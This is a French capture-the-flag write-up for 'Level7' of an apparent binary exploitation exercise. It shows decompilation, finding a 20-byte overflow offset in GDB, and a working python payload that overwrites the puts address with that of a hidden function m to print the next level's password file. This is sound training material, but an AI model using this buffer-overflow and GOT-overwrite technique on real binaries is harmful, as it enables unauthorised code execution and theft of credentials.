
# Level7
---
###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme deux fonctions. M et Main : 

On voit par la suite que dans la fonction M il y a la fonction __printf__ qui est appelé pour ecrire le .pass de prochain level. Mais probleme la fonction M n'est pas appelé.

On voit deux buffer dans la fonction Main qui peuvent etre oveflow pour casse la fonction puts a la fin de celle-ci.

###### Étape 2: -- Overflow --

Depuis __GDB__, on cherche l'offset de la variable buffer1. -> ==20==.

on cherche ensuite l'addresse de la fonction m et de la fonction __puts__.


###### Étape 3: -- Execution --

Avec offset, et les addresses , on crée un one-liner python pour executer un payload pour lire le .pass du prochain level.

Contruction du payload: 
> ./binary $(python - c 'print  + "A" * [offset] + "[puts_address]') $(python -c 'print [m_address]') | 

Payload final :
```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Dans le terminal on execute la commande suivante pour récupérer le password du level8:

```bash
cat /home/user/level8/.pass
```


